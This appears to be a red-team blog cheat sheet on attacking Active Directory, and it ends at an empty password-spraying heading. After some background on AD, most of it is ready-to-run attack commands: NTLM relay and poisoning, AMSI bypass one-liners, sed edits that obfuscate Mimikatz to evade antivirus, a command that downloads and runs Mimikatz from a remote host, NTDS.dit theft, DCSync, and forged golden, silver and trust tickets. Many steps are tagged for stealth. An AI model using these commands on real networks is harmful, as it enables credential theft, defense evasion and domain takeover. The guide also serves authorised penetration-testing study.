---
layout: single
title: Red Teaming Active Directory
date: 2020-06-13
classes: wide
tags:
  - Red Team
--- 

# Red Teaming Active Directory

## Introduction

When delivering an advanced penetration test or red team exercise, we want our activities to look like normal actions. Not only we will be stealthy this way, but we will minimize the posssibilities of disrupting normal operations as well. 

## Active Directory Fundamentals.
  
  - AD grants access based on Kerberos Tickets.  
  - Non-Windowsdevices can also authenticate using LDAP or RADIUS.  
  - Single Sign-On (SSO) Allows server programs to authenticate users based on their AD credentials.  

### Protocol

  - Lightweight Directory Access Protocol (LDAP):  
    - X.500 Standard.  
    - Method por accessing, searching, and modifying a directory service
    - client-server model.  

### Authentication  

  - Common Logon Scenearios:  
    - Interactive Logon: Grants access to the local computer.  
    - Network Authentication: Grant access to network resources.   
  - Common Authentication Security Support Providers:
    - [NTLM](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831571(v=ws.11))  
    - [Kerberos](https://technet.microsoft.com/en-us/library/hh831553(v=ws.11).aspx)    

#### Weaknesses  

| NTLM                                  | Kerberos                                                |
|:--------------------------------------|:--------------------------------------------------------|
| The encryption emplyed can be cracked | When RC4 is used --> NTLM Hash                          |
| No Mutual Authentication              | Compromise of the long term key --> Compromise Kerberos |
| Hash employed for all communications  | Credential Reuse                                        |
| Credential Reuse                      | TGS PAC Validation is usually skipped                   |
| Leak credentials from browsers        |                                                         |


#### Attacks

**NTLM:**  
  
  - SMB Relay.  
  - Intranet HTTP NTLM Authentication - Relay to Attacker.  
  - NBNS/LLMNR Poisoning (Including WPAD attacks).   
  - HTTP -> SMB NTLM Relay.  
  - ZackAttack - Socks Proxy, SMB/HTTP, LDAP, etc.
  - Pass-The-Hash.  

**Kerberos:**  

  - [Replay Attacks](http://windowsitpro.com/active-directory/understanding-how-kerberos-authentication-protects-against-replay-attacks)
  - [Pass-The-Ticket](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)    
  - [Over-pass-the-hash aka pass-the-key](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)   
  - Offline (User) Password Cracking ([Kerberoast](https://adsecurity.org/?p=2293))  
  - Forged Tickets - [Golden](https://adsecurity.org/?p=1640)/[Silver](https://adsecurity.org/?p=2011)  
  - [Diamond PAC](https://www.blackhat.com/docs/eu-15/materials/eu-15-Beery-Watching-The-Watchdog-Protecting-Kerberos-Authentication-With-Network-Monitoring-wp.pdf)  
  - [MS14-068](https://www.blackhat.com/docs/eu-15/materials/eu-15-Beery-Watching-The-Watchdog-Protecting-Kerberos-Authentication-With-Network-Monitoring-wp.pdf).  
  - [Skeleton Key](https://www.secureworks.com/research/skeleton-key-malware-analysis).  

#### Authorization.  

  - User sends security Token.  
  - AD Checks if user in ACL for the requested object/resource.  
  - Some attributes contanided in security token:  
    - User Group.  
    - Ownership.  
    - Admin Privileges.  
  - SID identifies security principals, unique for each user or security group.  
  - Access Control List (ACL) is a list of Access Control Entries (ACE).  
  - Each ACE identifies a security principal and its access rights. Can generate audit records when an access attemp fails, succeeds, or both.    
  - Security Descriptors for an object can contain two types of ACLS, DACL and SACL.   
    - DACL: Discretionary Access Control List, Identifies security principals that are allowed or denied to an object.  
    - SACL: System Access Control List, log attempts to access a secured object. 

#### Active Directory Components  

  - Domain Controllers:  
    - Host a copy of the AD DS Directory Store  
    - Provide Authentication and authorization services  
    - Replicate updates to other domain controllers in the domain forest.  
    - Allow administrative access to manage user accounts and network resources.  
    - RODCs: Read-Only DC services. Has its own Kerberos Account isolated. Do not have any domain related passwords by default.  
    - RODCs can not made updates to the AD DS data.  
  - Global Catalog Servers:  
    - DCs that cab store a copy of the global catalog.  
    - Contains a copy of all AD DS objects in a forest. Includes some of the attributes for each object in the forest.  
    - Improves efficiency of object searches by avoiding unnecessary referrals to DCs   
    - Required for users to log on to a domain.  
    - Admins can't enter information directly into this partition. Builds and Updates content based on *isMemberOfPartialAttributeSet*.      
  - Data Store  
    - Database files and processes that store and manage directory information for users, services and applications.  
    - Stored in **%SystemRoot%\NTFD\Ntds.dit** by default on all DCs.  
      1. Store the objects accesible in the AD.  
      2. Provide references to Objects.  
      3. Store the security descriptors.  
    - Only accessible through the DCs processes and protocols.  
  - AD DS Replication.  
    - Copies all updates of the AD DS database to all other DCs in a domain forest.  
    - Ensures all DCs have the same information.  
    - Uses multimaster replication model.  
    - Can be managed by creating AD DS sites.  
    - DCs in the same site replicate their data within 15 seconds after a change, completing replication with all members in about 45 seconds.  
  - Domains: 
    - Used to group and manage objects in an organisation.  
    - Administrative boundary for applying policies to groups of objects.  
    - Replication boundary for replicating data between DCs.  
    - Authentication and authorisation boundary that provides a way to limit the scope of access to resources.  
  - Trees:  
    - Hierarchy of domains in AD DS.   
    - Share contiguos namespace with the parent domain.  
    - Can have additional child domains.  
    - By default create a 2-Way transitive trust with other domains.  
  - Forests:
    - Collection of one or more domain trees.  
    - Share common Schema, Configuration Partition and Global Catalog to enable searching.  
    - Enable trusts between all domains in the forests.  
    - Share the enterprise Admins and Schema Admin groups.  
  - Organisational Units (OUs)
    - Represent organisation hierarchivally and logically.  
    - Manage a collection of objects in a consistent way.  
    - Delegate permissions to administer groups of objects.  
    - Apply policies.  
  - Trusts: Provide a mechanism for users to gain access to resources in another domain.  
    - Types of trusts:
      1. Directional: Direction flows from from trusting domain to the trusted domain <-->.  
      2. Transitive: Trust relationship is extended beyond a two-domain trust to include other trusted domains.  
    - All domains in a forest trust all other domain in the forest.  
    - Trusts can extend outside the forest.  
    - Domains can allow access to shared resources outside theur boundaries using a trust. Logon and accessing resources in any domain in the forest can be achieved using trusts.  
  - Interesting Resources: 
    - [Active Directory Architecture](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/bb727030(v=technet.10))
    - [Windows Server 2012 R2 Inside Out: Active Directory Architecture](https://www.microsoftpressstore.com/articles/article.aspx?p=2217264) 

## Traditional AD Attacks.  

### LDAP Relay

The attacks lifecycle is the following:

  1. Identify a Domain Administrator's workstation.  
	2. Become a man in the middle between his workstation and the gateway.  
	3. Inject a hidden link in the web traffic pointing to a HTTP listener that requests NTLM authentication.  
	4. Redirect the captured credentials to the DC.  

*Works against 2008 and 2012 Servers*
[intercepter-ng](http://sniff.su/)  

### Exploiting Group Policies

Group Policy is an infrastructure that allows administrators to implement specific configurations for users and computers.  
Group Policy settings are contained in Group Policy objects (GPOs)
The feasibility of such an attack was demonstrated during MS15-011 disclosure. This vulnerability allows an attacker to perform a MiTM attack and send custom GPOs back to a Windows system.  

Requirements:  

  1. SMB Signing not enforced
  2. Attacking machine NOT domain joined
  3. "Network Access: Let everyone permissions apply to anonymous users" enabled
  4. "Advanced sharing options" permissions configured to be accessible by the targeeted machine.  

*Works against 2008 and 2012 Servers*

[intercepter-ng](http://sniff.su/)  
[Bypass MS15-014](https://blog.rapid7.com/2015/03/12/are-you-really-protected-against-group-policy-bypass-and-remote-code-execution/)  

### RDP MiTM

Tools:
  
  - [Seth (Python & Bash)](https://github.com/SySS-Research/Seth)
    - [Adrian Vollmer - Attacking RDP with Seth](https://www.youtube.com/watch?v=wdPkY7gykf4)
  - [CAIN](http://www.oxid.it/ca_um/topics/apr-rdp.htm)

Prevention:
  
  - Network Level Authentication (NLA).  
  - ARP Poisoning is **NOT OPSEC SAFE**.  

Lateral Movement using RDP:  
  
  - **OPSEC SAFE**
  - http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html  
  - https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6   

### Sniffing Authentication Traffic.

Usernames and domains can be easily identified as they are trasmitted in clear text. Tools:  

 - Cain.  
 - Intercepter.  
 - [PCredz](https://github.com/lgandx/PCredz)  

**NOT OPSEC SAFE**

### Downgrading NTLM 

[CAIN](http://www.oxid.it/ca_um/topics/apr-rdp.htm) functionality can perform a downgrading attack. **NOT OPSEC SAFE**, ARP cache poisioning attacks can be easily detected by mordern defenses.  

### Non-Microsoft systems leaking credentials.  

Web proxies, internal apps, virtualisation consoles, database servers could use Basic Auth or LM network authentication protocols. Even with HTTPS we may be able to extract (privileged) credentials sniffing traffic. **NOT OPSEC SAFE**.  

### LLMNR and NBT-NS Poisoning  

LLMNR and NBT-NS resolve hostnames no IP Addresses. When we try to resolve a hostname, firts contacts the DNS and if that failes LLMNR will be reached.  

SMB Relay requires privileged credentials and SMB signing not enforced.  

  - [Responder](https://github.com/lgandx/Responder)
  - [Snarf](https://github.com/purpleteam/snarf) **OPSEC SAFE**.  

Steps required for the attack:  

  1. ```python RunFinger.py -i IP``` --> Machines not enforcing smb signing. CME does the same.  
  2. Snarf will be used as SMB Server, set SMB=Off inside responder.conf.  
  3. ```node snarf.js <ATTACKING_MACHINE_IP>``` --> Load snarf.  
  4. ```python responder.py -I <iface>```   
  5. Snard captures the SMB connection and keeps it alive.  
  6. ```smbclient -L 127.0.0.1 -U <ANY_USER>``` --> Snarf will forward the captured credentials when connecting to localhost.  
  7. ```net rpc shell -I 127.0.0.1```  
    - ```user edit```
    - ``` disabled administrator``` --> Check if built-in admin is disabled to check if pth is possible.  
  8. ```python secretsdump.py <DOMAIN>/<USER>%<PASSWORD>@127.0.0.1``` --> Dump hashes from the targeted machine without executing any agent.**OPSEC SAFE**  
  9. ```john --format=mscash2 --wordlist=wordlist.txt /root/hashes.txt``` --> Obtained hashes can be cracked offline.  
  10. ```python wmiexec.py <DOMAIN>/<USER>%<PASSWORD>@<TARGET_IP>``` --> Lateral movement using impacket's wmiexec. **OPSEC SAFE**  

From an unprivileged user we still can achieve something:  

  - ```net rpc registry enumerate 'HKEY_USERS' -I 127.0.0.1 -U '<DOMAIN>\<USER>'``` --> Unprivileged users can query HKU hive to identify SIDs of logged users.  
  - ```rpclient 127.0.0.1 -U '<DOMAIN>\<USER>' -c "lookupsids <extracted_sid>"``` --> Resolve SIDs of logged users to identigy administrators.  

Some alternatives to this method to achieve the same are msf msbrelay module, impacket's smbrelayx or responder's multirelay but they are **NOT OPSEC SAFE**.  

## Red Team AD Attacks

Focused on **OPSEC SAFE** attack tactics and techniques.  

### Poweshell defenses in AD

Powershell has been abused over the last years. This is why in Powershell v5 onwards some security enhancements were introduced.  

  1. Script block logging --> Deobfuscates powershell and creates eventlog with ID 4104.  
  2. System-wide transcript file --> if enabled, a share on the network will keep everything typed in powershell inside the transcript file.  
  3. Constrained language mode --> Disables .NET, COM and Win32 API Calls when enforced. Powershell and [AppLocker](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd723678(v=ws.10)) will automatically lock down powershell. The same with Device Guard with [UMCI](https://docs.microsoft.com/en-gb/windows/security/threat-protection/device-guard/introduction-to-device-guard-virtualization-based-security-and-windows-defender-application-control) deployed.  
  4. AMSI (Anti-Malware Scan Interface) --> Decodes powershell before executing, detects in-memory attacks.  

### Bypassing Powershell defenses.  

#### AMSI bypasses:  

  - ```[Ref].Assembly.GetType('http://System.Management .Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)``` --> Busted, no longer works.  
  - ```[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)``` --> AMSI bypass and disables WMF5 autologging. 
  - [DLL Hijacking AMSI Bypass](http://cn33liz.blogspot.com/2016/05/bypassing-amsi-using-powershell-5-dll.html)  
  - [Bypassing AMSI via COM Server Hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/)  
  - Unmanaged powershell (Rolled into metasploit) --> Executes PS commands without calling powershell.exe  
  - [PSAmsi](https://github.com/cobbr/PSAmsi) --> Audit and defeat AMSI Signatures.  
  - [Invoke-AMSIBypass.ps1](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1) --> Various AMSI bypasses in one place.  

#### Constrained Language Mode and Powershell Logging Bypasses

  - [PSAttack](https://github.com/jaredhaight/psattack) --> Single executrable wich contains some of the most popular Powershell attack tools. Encrypted in the file and decrypted/run from memory. Bypasses Constrained Language Mode and Powershell Logging.  
  - [PowerPick](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) --> Execution of Powershell functionality without the use of Powershell.exe.  
  - [Babushka Dolls](https://improsec.com/blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell) --> Bypass app whitelisting, constrained language mode, etc.  
  - [Powershell Code Injection](http://www.exploit-monday.com/2017/08/exploiting-powershell-code-injection.html)  --> Find signed and vulnerable PowerShell modules and exploit them.  

### Paths to AD Compromise.  

#### AMSI Evasion and Mimikatz patch bypass

  - [Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)  
  - ```sed -i -e 's/Invoke-Mimikatz/Invoke-LSASSscraper/g' Invoke-Mimikatz.ps1``` --> Replace *Invoke-Mimikatz* Strings.  
  - ```sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1``` --> Remove comments.  
  - ```sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1``` --> Remove indented comments.  
  - ```sed -i -e 's/DumpCred/Dump/g' Invoke-Mimikatz.ps1``` --> Replace Suspicious functions.  
  - ```sed -i -e 's/ArgumentPtr/Obf/g' Invoke-Mimikatz.ps1``` --> Replace suspicious functions.  
  - ```sed -i -e 's/CallDllMainSC1/ObfSC1/g' Invoke-Mimikatz.ps1``` --> Replace suspicious functions.  
  - ```sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1``` --> Replace suspicious functions.  
  - Use ```Convert-BinaryToString``` top update Mimikatz binary inside the Invoke-Mimikatz.ps1 script.  
  - [ISESteroids](http://www.powertheshell.com/isesteroids/) to obfuscate the code ().  
  - Test using powershell as administrator.  
  - ```powershell -ep bypass "IEX (New-Object Net.Webclient).DownloadString('http://[HOST]/mimikatz); Invoke-LSASSscraper"```. 
  - ```mimikatz # sekurlsa::logonpasswords``` --> Search Clear Text Passwords.  
  - ```reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f``` --> Revert Mimikatz Patch to extract clear text passwords from memory.  
  - ```rundll32 User32.dll,LockWorkStation``` --> Locks the workstation for the user to re-enter credentials.  
  - ```mimikatz # sekurlsa::logonpasswords``` --> Clear Text password extracted.    
  
#### MS14-068 Kerberos.  

Exploiting this vulnerability enables the re-writing of a ticket from domain user to domain admin in 5 minutes due to the lack of validation group memberships in Kerberos tickets < Windows 2012 (R2).  

**TOOLS:**  

  - [KrbCredExport](https://github.com/rvazarkar/KrbCredExport) --> Exports Kerberos KrbCred Tickets for use in Mimikatz/Beacon from a Kerberos CCache File.  
  - [Kekeo](https://github.com/gentilkiwi/kekeo) --> kekeo is a little toolbox I have started to manipulate Microsoft Kerberos in C.
  - [ms14_068_kerberos_checksum](https://www.rapid7.com/db/modules/auxiliary/admin/kerberos/ms14_068_kerberos_checksum) --> Metasploit module for exploiting the vulnerability. PyKEK not avaiable anymore on githhub.  
  - [Exploiting Steps](https://blog.cptjesus.com/posts/ms14068)

**STEPS:**

  - ```Get-NetDomainControllers``` --> PowerView   
  - ```dig SRV _ldap._tcp.dc_msdsc.domain.name@<dns_server_ip>``` --> Same result as previous step from a linux box.  
  - ```rpclient -U testuser <DC_IP>```  
  - ```rpcclient $> lookupnames testuser``` --> Get the SID.  
  - ```System.Security.Principal.NTAccount("TEST","testuser")).Translate([System.Security.Principal.SecurityIdentifier]).Value``` --> Get the SID using Powershell.  
  - ```whoami /user``` --> Get the SID if you are logged somewhere.  
  - ```python ms14-0068 -u testuser@test.domain -s <SID> -d <DC_IP>``` --> Creates a .ccache file.  
  - ```use auxiliary/admin/kerberos/ms14_068_kerberos_checksum``` --> Creates a .bin file with the ticket.  
  - Kekeo compiles to an executable. It can be run only on windows but lookups the SIDs itself. Ticket will be exported in KrbCred format.  
  - Msf and PyKEK Tickets needs to be exported to KrbCred to be used with Mimikatz:  
    - ```mimikatz # kerberos::clist <file_name> /export``` --> Exporting with mimikatz.  
    - ```KrbCredExport.py <file_name> <output_file>``` --> Exports to mimikatz ticket from Linux.  
  - Clean any current loaded ticket from memory before.  
  - SMBClient and Winexe accepts CCache ticket files.  

#### Unconstrained Delegation  

"Double-hop" Kerberos issue was solved with unsconstrained delegation. When the user requests a service ticket for a service running on the server wich has an unconstrained delegation, the DC takes a copy of the user's TGT, puts it into the service ticket (LSASS) and delivers it back to the user. This feature can be abused to compromise the AD.  

  - ```Get-DomainComputer -Unconstrained``` --> Enumerate computers with Kerberos unsconstrained delegation.  
  - ```Get-DomainUser -AllowDelegation -AdminCount``` --> Identify privileged users with unprotected credentials against systems having unconstrained delegation.  
  - Compromise the Server with unconstrained delegation.  
  - Admin with unprotected credentials must connect to the server featuring unconstrained delegation over a Kerberos Service. (Social Engineering)
  - ```usemodule credentials/mimikatz/command*```
  - ```set Command sekurlsa::tickers /export``` --> Dump available tickets using Empire.  
  - ```usemodule credentials/mimikatz/command```  
  - ```set Command kerberos:ptt <ticket_file_name>``` --> Pass the ticket using mimikatz.  
  - ```usemodule lateral_movement/invoke_psremoting```  
  - ```set listener http```  
  - ``` set ComputerName <DC>``` --> Powershell remoting to connect to the DC using the Admin ticket.  
  - ```usemodule credentials/mimikatz/command```  
  - ```set Command sekurlsa::krbtgt``` --> Dump KRBTGT Account's password hash to create Golden Tickets.   

#### OverPass-the-Hash (Making the best of NTLM password hashes)  

Pass-the hash attacks are detected with event 4624 and mitigated within newer systems. Clearing out all the kerberos encryption keys that are on a system and injecting a NTLM password hash, we can take that password hash and switch it over so that we're effectively using a Kerberos Ticket. **OPSEC SAFE**.  

  - Mimikatz executed on a compromised machine and Domain Admins NTLM password hash found.  
  - ```mimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>``` --> Will likely cause an alert since the encryption method of the Encrypted_Timestamp field of AS_REQ message is being downgraded. **NOT OPSEC SAFE**  
  - ```usemodule credentials/mimikatz/command```  
  - ```set Command sekurlsa::ekeys``` --> Extract AES Keys first to make OPTH attack stealthier.  
  - ```usemodule credentials/mimikatz/command```  
  - ```set Command sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /aes128:<AES128_KEY> /ntlm:<NTLM_HASH> /run:notepad.exe``` --> Execute a process to steal the token later.
  - ```steal_token <Notepad_PID>``` --> Steal process token.  
  - ```shell dir \\<DC>\C$``` --> Use stolen token!  

#### Pivoting with Local Admin & Passwords in SYSVOL  

Password reuse is a common for local admin accounts. Although Microsoft issued a patched that no longer stores passwords in Group Policy Preferences, if they were there before the patch, they wont be deleted.  

  - ```\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\``` --> All GPP are stored here and are world readable.  
  - ```%LOGONSERVER%``` --> 
  - [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) --> Find and extract GPP Passwords.  
  - [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288).  
  - [Find-GPOPassword.ps1](https://github.com/zloeber/PowerShellProfile/blob/master/Scripts/Get-GPOPassword.ps1) --> More comprehensive work finding GPP Passwords.  
  - *cpassword* --> Key value to find inside the XML GPP files.  

#### Dangerous Built-in Groups Usage.  

Built-in groups are commonly used intead of custom delegation. Members of *Account Operators* and *Print Operators* can log on to the main controller by default. Consequently, If a helpdesk account is compromised, the entire domain will be compromised too.  

#### Dumping AD Domain Credentials.  

**NTDS.dit** is the AD database file, if the file is extracted we can spoof any user within the domain or create golden tickets. It can be found on DC backups or external network storage devices. In addition, VMWare admins have the ability to clone a virtual DC within VMware, if an account is compromised, a DC can be cloned and the NTDS.dit file copied without even starting the clone. **OPSEC SAFE**  

Task manager can be used to dump LSASS into a LSASS dump file and run mimikatz against it on another box. **OPSEC SAFE**  

  - TaskManager --> lsass.exe --> Create dump file.  
  - ```mimikatz # sekurlsa::minidump <dump_file>``` --> Extract credentials from the file.
  - [Alternative Method to investigate](http://www.exploit-monday.com/2012/03/powershell-live-memory-analysis-tools.html)  
  - Once Domain Admin credentials are extracted the next step is to remotely get the **NTDS.dit** file.

**Remotely Get the DIT:**  
  
  - ```wmic /node:<DC-HOSTNAME> /user:<Domain-User> /password:<Password> process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > c:\vss.log"``` --> Shadow volume creation.  
  - ```wmic /node:<DC-HOSTNAME> /user:<Domain-User> /password:<Password> process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\temp\NTDS.dit 2>&1 > c:\vss2.log"``` --> Copy NTDS.dit from VSS snapshot to C:  
  - ```wmic /node:<DC-HOSTNAME> /user:<Domain-User> /password:<Password> process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\windows\temp\SYSTEM.hive 2>&1 > c:\vss2.log"``` --> Copy SYSTEM registry hive from VSS snapshot to C:  

**Remotely Get the DIT when no clear-text password exists:**  

  - ```wmic authority:"Kerberos:<DOMAIN>\<DC-HOSTNAME>" /node:<DC-HOSTNAME> process call create...``` --> Pass-the-ticket before executing this command. 
  - ```usemodule collection/ninjacopy``` --> Powersploit Invoke-NinjaCopy from Empire.  

**Using NTDSUtil**  

  - ```ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q``` --> Having access to the DC, NTDSUtil can be used with "install from media" option for creating a NTDS.dit and SYSTEM registry hive.  

**Extract Passwords from NTDS.dit**  

  - ```python secretsdump.py -system <SYSTEM.hive> -ntds <NTDS.dit> LOCAL``` --> Extract all password hashes from the domain using impacket's secretdump.  

**DCSync (Mimikatz)**  

A better approach for acquiring domain's password hashes. Enables us to act as a DC and request password data from the targeted DC. No need to interactive logon or pulling the NTDS.dit file. **OPSEC SAFE**  

Rights required to run DCSync: Administrators, Domain Admins, Enterprise Admins or DC computer account. A normal user with the following delefated rights can run DCSync as well, those are:

  - Replicating Directory Changes  
  - Replicating Directory Changes All
  - Replicating Directory Changes In Filtered Set (required in some environments)  
```mimikatz # lsadump:dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER>``` --> A user with delegated Replicating Directory Changes... used as stealth persistence.  

#### Golden Tickets

Once a domain is compromised, the KRBTGT account's password has can be obtanied. This account is used to encrypt and sign al Kerberos tickets within a domain. Those tickets can be forged to obtain access to any computer or service in the domain.  

  - Assuming a child Domain have been already compromised.  
  - ```usemodule situational_awareness/network/powerview/get_domain_trust``` --> Get all the trusts for the current domain.  
  - ```usemodule managemenet/user_to_sid``` --> Idenitfy krbtgt SID account to identify parent's domain SID.  
  - ```usemodule credentials/mimikatz/dcsync```   
  - ```set user domain\krbtft``` --> Extract krbtgt account password hash using DCSync.  
  - ```usemodule credentials/mimikatz/golden_ticket``` --> Generate Golden Ticket using empire.  
  - ``` mimikatz # kerberos::golden /admin:<USER-NAME> /domain:<CHILD-DOMAIN> /sid:<CHILD-DOMAIN-SID> /sids:<PARENT-DOMAIN-SID>-519 /krbtgt:<CHILD-DOMAIN-KRBTGT-PASSWORD-HASH> /startoffset:0 /endin:600 /renewmax:10080 /ptt``` --> Mimikatz command to create Golden Tickets.  
  - ```shell dir \\<PARENT-DOMAIN-DC>\C$``` --> Verify access.  
  - Execution of DCSync causes log entries that can be detected. While compromising the parent domain (DCSyncing agains it), use "ExtraSids (sids)" option for adding domain adding <DC-SID> and <ENTERPRISE-DC-SID>. **OPSEC SAFE**.  
  - ```usemodule lateral_movement/invoke_dcom``` --> Lateral movement in the parent domain DC.  

#### Kerberoast.  

Having a list of SPN associated with service accounts, Kerberos TGS service tickets can be requested and cracked offline. **OPSEC SAFE** and no admin needed.  
Community enhanced [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper).  
  - ```usemodule credentials/invoke_kerberoast``` --> Requests Kerberos tickets using Empire.   
  - ```john --format=krb5tgs <ticket_wordlist>``` --> Crack kerberos tickets. 
  - ```PS >> Add-Type -AssemblyName System.IdentityModel```   
  - ```New-Object System.IdentityModel.Tokens.Kerberos.RequestorSecurityToken - ArgumentList 'MSSQLSvc/DATABASESERVER.domain.local:1433'``` --> Manually request a kerberos ticket.  
  - ```mimikatz # kerberos::list /expoort``` --> Export Tickets
  - ```tgsrepcrack.py``` --> Crack kerberos tickets. [tgsrepcrack](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py).  

**Targeted Kerberoasting:** If a user with GenericWrite/GenericALL DACL rights over a target is compromised, instead of force-resetting the target's password, PowerView can be used to change target's SPN to any value, perform kerberoasting and finally repair the SPN. **OPSEC SAFE**.  

  - ```Get-DomainUser <Target> | Select serviceprincipalname``` --> Get SPN.  
  - ```Set-DomainObject -Identity <Target> -SET @{serviceprincipalname='whatever/anything'}``` --> Change SPN.  
  - ```$User = Get-DomainUser <Target>```   
  - ```$User | Get-DomainSPNTicker | fl```   
  - ```$User | Select serviceprincipalname```   
  - ```Set-DomainObject -Identity <Target> -Clear serviceprincipalname``` --> Restore

#### Silver Tickets

They are valid TGS forged tickets, so no communication with the DC occurs as they are encrypted/signed by the service/computer account. Silver tickets works only against a targeted service on a specific server. In addition, If PAC validation is not performed, it is possible to include a PAC that is unsubstantial, **OPSEC SAFE**. Requirements:  

  - A Service account's password hash, can be acquired using Kerberoast if the targered service operates under a user account.  
  - A computer account's password hash, can be acuired using Mimikatz if the targeted service is hosted by a computer.  

Scenario1: A domain user was compromised, privileges elevated and kerberoast was used to obtain the password hash of the service under wich MSSQL is operating.  

  - ```usemodule credentials/mimimatz/command``` --> Empire mimikatz module.  
  - ```set Command kerberos::golden /sid:<SID> /domain:<DOMAIN.LOCAL> /target:<Target.Domain:Port> /service:MSSQLSvc (SPN) /rc4:<RC4> /user:<Target-User> /ptt```  
  - ```shell sqlcmd -Q "SELECT Name, GroupName From Human.Resources.Department"``` --> With the ticket passed into the compromissed machine we can now interact with the databas as DBA.  

Scenario2: Breach recovery sceneario where attackers have dumped everything and the IT department goes through changing the account passwords. If computer accounts passwords from the DC is missed during this process, silver tickets can be created for al running services on that DC, stating "We are domain admin". Steps to re-compromise the DC:  

  - Any domain joined system can be used.  
  - ```kerberos::golden /sid:<SID> /domain:<DOMAIN.LOCAL> /target:<DC.Target.Domain> /service:http /rc4:<RC4> /user:Administrator /ptt``` --> Create a Silver Ticket for the http service.  
  - ```kerberos::golden /sid:<SID> /domain:<DOMAIN.LOCAL> /target:<DC.Target.Domain> /service:wsman /rc4:<RC4> /user:Administrator /ptt``` --> Create a Silver Ticket for the wsman service.

Notes:
  - By default, computer account passwords change every 30 days and 2 passwords are stored on the computer.  
  - PAC validation not useful when targeted services are system ones.  

#### Trust Tickets

![](https://adsecurity.org/wp-content/uploads/2015/07/Visio-Cross-Domain-Keberos-Comms-Visio.png)

A User on the blue domain is already logged on and wants to access a resource in the green domain, across the trust. The DC on the blue domain creates and sends a new TGT to the user along with the referral to the green domain DC. This ticket is signed with the inter-realm key of the forest trust, not the KRBTGT account from those domains.  

Having access to this password means that cross-domain tickets can be forged. Any user in the blue domain can be impersonated and access to the permissioned services or resources from the green domain obtained.  

  - ```kerberos::golden /domain:<domain> /sid:<domain_sid> /rc4:<trust.password_NTLM_Hash> /user:Administrator /service:krbtgt /target:<external_domain_FQDN> /ticket:<path_to_save_the_ticket>``` --> Mimikatz command to create a trust ticket.  
  - ```.\asktgs <trust_ticket> cifs/<external_domain_dc>``` --> Kekeo's asktgs to obtain a TGS for targeted services (cifs here).  
  - ```.\Kirbinator lsa <path_to_TGS>``` --> Inject the TGS using kekeo's kirbinator to access the targeted service.  
  - ```usemodule credentials/mimikatz/command``` --> Select mimikatz module from empire.  
  - ```set Command lsadump::trust /patch``` --> Mimikatz patches the LSASS process.  
  - This can be used to compromise the parent domain.  

### Kerberos tickets when NTLM is disabled  

If NTLM is disabled, you can [Configure Kerberos in your attacking machine](http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html?m=1) to checkout a TGT.  

Having a valid password:  

  - ```kinit 2ndAdmin@ELS.LOCAL``` --> Generate Ticket.  
  - ```KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass els.local/2ndAdmin@user8.els.local``` --> Use the TGT ticket created with kinit and impacket wmiexec.  

Having a valid password hash (OverPass-the-Hash):

  - ```kutil -k ~/mykeys add -p 2ndAdmin@ELS.LOCAL -e arcfour-hmac-md5 -w <PASSWORD-HASH> --hex -V5``` --> Switch the NTLM password hash to the 2ndAdmin into a Kerberos Ticket.  
  - ```kinit -t ~/mykeys 2ndAdmin@ELS.LOCAL``` --> Generate Ticket.  
  - ```KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass els.local/2ndAdmin@user8.els.local``` --> Use the TGT ticket created with kinit and impacket wmiexec.  

### Password Spraying using Kerberos

